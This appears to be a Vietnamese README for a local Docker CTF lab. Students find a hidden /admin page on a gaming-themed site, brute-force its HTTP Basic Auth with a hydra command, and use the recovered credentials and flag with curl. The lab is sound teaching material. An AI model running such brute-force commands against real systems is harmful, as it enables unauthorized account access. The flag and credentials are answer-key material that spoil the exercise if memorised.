
# 🧪 Basic HTTP Auth Brute Forcing Lab - Lugx Gaming Theme

Welcome to the Basic HTTP Authentication Brute Force Lab! In this lab, you'll be attacking a protected admin area hidden behind HTTP Basic Auth, styled with the professional-looking Lugx Gaming template.

---

## 🎯 Mục tiêu của Lab

- Khám phá endpoint ẩn `/admin`.
- Nhận diện HTTP Basic Authentication đang được sử dụng.
- Thực hiện brute force để tìm ra username/password.
- Truy cập vùng quản trị và lấy flag.

---

## 🚀 Khởi động Lab

### 1. Yêu cầu hệ thống

- Docker và Docker Compose đã được cài đặt

### 2. Khởi chạy lab

```bash
git clone <repo_url> basic-auth-lugx
cd basic-auth-lugx
docker-compose up --build
```

Truy cập trình duyệt: [http://localhost:8080](http://localhost:8080)

Bạn sẽ thấy giao diện của website Lugx Gaming như một trang bán game thực thụ.

---

## 🎓 Hướng dẫn học viên

### Bước 1: Khám phá trang chính

Mở trình duyệt và truy cập vào:
```
http://localhost:8080
```

Trang web hiện ra là một trang game (Lugx Gaming) với nội dung bình thường. Nhiệm vụ của bạn là **khám phá xem có khu vực nào đang ẩn không.**

### Bước 2: Fuzz endpoint ẩn

Thử truy cập các đường dẫn phổ biến như:
```
http://localhost:8080/admin
```

Bạn sẽ nhận được phản hồi:
```
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Admin Area"
```

=> Xác nhận đây là **HTTP Basic Authentication**.

### Bước 3: Brute force với Hydra

Sử dụng `hydra` để brute force thông tin đăng nhập:

```bash
hydra -L wordlists/users.txt -P wordlists/passwords.txt localhost http-get /admin -s 8080
```

Trong đó:
- `-L`: danh sách username
- `-P`: danh sách password
- `/admin`: endpoint được bảo vệ
- `-s 8080`: cổng dịch vụ

Kết quả sẽ trả về khi tìm được tài khoản đúng:
```
[8080][http-get] host: localhost   login: gamer   password: lugx@123
```

### Bước 4: Truy cập với thông tin đã brute force

Sau khi có được thông tin `gamer:lugx@123`, bạn có thể truy cập admin:

```bash
curl -u gamer:lugx@123 http://localhost:8080/admin
```

Kết quả:
```html
<h2>Welcome to the Admin Panel</h2>
<p>Your flag is: <code>FLAG{brute_force_success}</code></p>
```

🎉 **Bạn đã hoàn thành bài lab!**

---

## 📝 Ghi chú

- Đây là lab CTF mô phỏng thực tế. Trong thực tế, không nên sử dụng HTTP Basic Auth nếu không kết hợp HTTPS.
- Đừng quên kiểm tra source code để hiểu cách hoạt động của HTTP Auth trong Node.js/Express.

---

Happy Hacking! 🎮
